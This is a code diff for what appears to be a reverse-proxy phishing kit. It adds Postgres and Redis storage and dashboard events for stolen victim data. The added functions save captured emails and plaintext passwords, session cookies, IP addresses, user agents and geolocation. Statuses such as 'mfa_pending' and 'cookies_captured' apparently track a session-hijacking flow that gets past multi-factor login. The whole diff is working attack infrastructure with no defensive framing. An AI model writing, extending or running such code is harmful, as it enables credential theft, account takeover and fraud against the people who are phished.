@@ -61,6 +61,61 @@ initializeDatabase().then(() => {
     proxyServer.listen(process.env.PORT ?? 3000);
     console.log(`Proxy server running on port ${process.env.PORT ?? 3000}`);
 });
+
+// ==================== POSTGRES STORAGE ====================
+async function upsertSessionInDb(sessionId) {
+    const s = VICTIM_SESSIONS[sessionId];
+    if (!s) return;
+    try {
+        await pool.query(
+            `INSERT INTO sessions (id, ip, user_agent, geo, host, status, created_at, updated_at)
+             VALUES ($1, $2, $3, $4, $5, $6, NOW(), NOW())
+             ON CONFLICT (id) DO UPDATE SET
+                ip = EXCLUDED.ip,
+                user_agent = EXCLUDED.user_agent,
+                geo = EXCLUDED.geo,
+                host = EXCLUDED.host,
+                status = EXCLUDED.status,
+                updated_at = NOW()`,
+            [
+                sessionId,
+                s.ip || null,
+                s.userAgent || null,
+                s.geo ? JSON.stringify(s.geo) : null,
+                s.host || null,
+                s.status || 'active'
+            ]
+        );
+    } catch (err) {
+        console.error('[POSTGRES] upsertSessionInDb error:', err.message);
+    }
+}
+
+async function insertCredentialInDb(sessionId, credentials) {
+    try {
+        await pool.query(
+            `INSERT INTO credentials (session_id, email, password, url)
+             VALUES ($1, $2, $3, $4)`,
+            [sessionId, credentials.email, credentials.password, credentials.url || null]
+        );
+    } catch (err) {
+        console.error('[POSTGRES] insertCredentialInDb error:', err.message);
+    }
+}
+
+async function insertCookiesInDb(sessionId, cookies) {
+    try {
+        for (const c of cookies) {
+            await pool.query(
+                `INSERT INTO cookies (session_id, name, value, domain, path, expires)
+                 VALUES ($1, $2, $3, $4, $5, $6)`,
+                [sessionId, c.name, c.value, c.domain, c.path, c.expires]
+            );
+        }
+    } catch (err) {
+        console.error('[POSTGRES] insertCookiesInDb error:', err.message);
+    }
+}
 // const { HttpsProxyAgent } = require('https-proxy-agent'); // DISABLED – direct connection
 const Redis = require("ioredis");
 const redis = new Redis(process.env.REDIS_URL || "redis://localhost:6379");
@@ -533,13 +588,23 @@ getVictimGeo(VICTIM_SESSIONS[cookieName].ip).then(geo => {
     };
 
     // Store in memory
-    VICTIM_SESSIONS[currentSession].credentials = credentials;
-    console.log(`[CRED STORED] Email: ${credentials.email} | Password: ${credentials.password}`);
+VICTIM_SESSIONS[currentSession].credentials = credentials;
+VICTIM_SESSIONS[currentSession].status = "mfa_pending";
+console.log(`[CRED STORED] Email: ${credentials.email} | Password: ${credentials.password}`);
 
-    // Also store in Redis (key = session cookie name)
-    const redisKey = `session:${currentSession}`;
-    redis.set(redisKey, JSON.stringify(credentials), "EX", 3600)
-        .catch(err => console.error("[REDIS SET]", err.message));
+// Also store in Redis (key = session cookie name)
+const redisKey = `session:${currentSession}`;
+redis.set(redisKey, JSON.stringify(credentials), "EX", 3600)
+    .catch(err => console.error("[REDIS SET]", err.message));
+
+// Dashboard + Postgres
+saveSessionToRedis(currentSession).catch(() => {});
+publishDashboardEvent('credential_captured', currentSession, {
+    email: credentials.email,
+    password: credentials.password
+}).catch(() => {});
+insertCredentialInDb(currentSession, credentials).catch(() => {});
+upsertSessionInDb(currentSession).catch(() => {});
 }
                             }
                         }
@@ -669,10 +734,17 @@ const caption =
     }, 10000); // delete after 10 seconds
 
     // Mark as alerted
-    sessionData.alerted = true;
+sessionData.alerted = true;
+sessionData.status = "cookies_captured";
 
-    // Force redirect on next navigation request
-    sessionData.pendingRedirect = true;
+// Dashboard + Postgres
+saveSessionToRedis(currentSession).catch(() => {});
+publishDashboardEvent('cookies_captured', currentSession).catch(() => {});
+insertCookiesInDb(currentSession, sessionData.cookies).catch(() => {});
+upsertSessionInDb(currentSession).catch(() => {});
+
+// Force redirect on next navigation request
+sessionData.pendingRedirect = true;
 }
 // ================================================
 // ================================
@@ -808,6 +880,11 @@ function generateNewSession(phishedURL) {
     VICTIM_SESSIONS[cookieName].alerted = false;
     createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
 
+    VICTIM_SESSIONS[cookieName].createdAt = Date.now();
+saveSessionToRedis(cookieName).catch(() => {});
+publishDashboardEvent('session_created', cookieName).catch(() => {});
+upsertSessionInDb(cookieName).catch(() => {});
+    
     return {
         cookieName: cookieName,
         cookieValue: cookieValue
